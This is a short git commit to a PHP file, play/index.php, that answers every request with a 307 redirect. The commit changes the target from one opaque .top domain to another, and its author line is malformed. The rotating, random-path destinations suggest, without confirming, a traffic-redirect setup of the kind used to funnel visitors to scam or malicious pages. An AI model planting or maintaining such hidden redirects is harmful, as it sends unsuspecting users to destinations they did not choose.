d9419dcb8638b886fd068a5d5a81a918a812afbe
PhoenixFan86 <johndoe@example.comphoenixfan86@gmail.com>
2026-02-24 16:58:40 +0200

    add new info

--- play/index.php
+++ play/index.php
@@ -3,6 +3,6 @@
 http_response_code(307);
 
 // Выполняем редирект на нужный URL
-header('Location: https://serversaviran.top/yTqhY3');
+header('Location: https://serversoliraq.top/9XYhbk');
 exit();
 ?>
